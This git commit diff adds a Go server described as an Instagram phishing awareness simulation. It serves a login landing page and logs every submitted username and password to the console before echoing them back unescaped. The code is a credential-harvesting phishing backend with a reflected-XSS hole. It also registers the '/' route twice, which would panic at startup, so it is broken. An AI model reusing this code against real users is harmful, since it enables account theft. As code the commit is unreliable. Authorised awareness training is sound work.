e72a5c9565cbeb58e1a0c33e8758be086982ce3a
annanya <annanya@arista.com>
2024-12-26 10:20:28 +0530

    simulation to capture creds entered on phishing page

---
+++ go.mod
@@ -0,0 +1,3 @@
+module github.com/instagram-phishing-simulation
+
+go 1.21.1
---
+++ main.go
@@ -0,0 +1,54 @@
+package main
+
+import (
+	"fmt"
+	"html/template"
+	"log"
+	"net/http"
+)
+
+type Credentials struct {
+	Username string
+	Password string
+}
+
+func main() {
+	http.HandleFunc("/", serveLandingPage)
+	http.HandleFunc("/capture", captureCredentials)
+
+	// fs := http.FileServer(http.Dir("./public"))
+	// http.Handle("/static/", http.StripPrefix("/static/", fs))
+	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("./public"))))
+	http.Handle("/", http.FileServer(http.Dir("./public"))) // Serves index.html
+
+	fmt.Println("Server running at http://localhost:8080")
+	log.Fatal(http.ListenAndServe(":8080", nil))
+}
+
+// Serve the HTML landing page
+func serveLandingPage(w http.ResponseWriter, r *http.Request) {
+	tmpl := template.Must(template.ParseFiles("public/index.html"))
+	tmpl.Execute(w, nil)
+}
+
+// Handle form submission
+func captureCredentials(w http.ResponseWriter, r *http.Request) {
+	if r.Method == "POST" {
+		username := r.FormValue("username")
+		password := r.FormValue("password")
+
+		fmt.Println("Captured Credentials:")
+		fmt.Printf("Username: %s\nPassword: %s\n", username, password)
+
+		// Respond to user
+		fmt.Fprintf(w, `
+			<h1>Phishing Awareness Simulation</h1>
+			<p>Thank you for participating in this simulation. Below are the credentials you entered:</p>
+			<p><strong>Username:</strong> %s</p>
+			<p><strong>Password:</strong> %s</p>
+			<p><em>This was a controlled exercise. Do not use your real credentials in such simulations!</em></p>
+		`, username, password)
+	} else {
+		http.Redirect(w, r, "/", http.StatusSeeOther)
+	}
+}
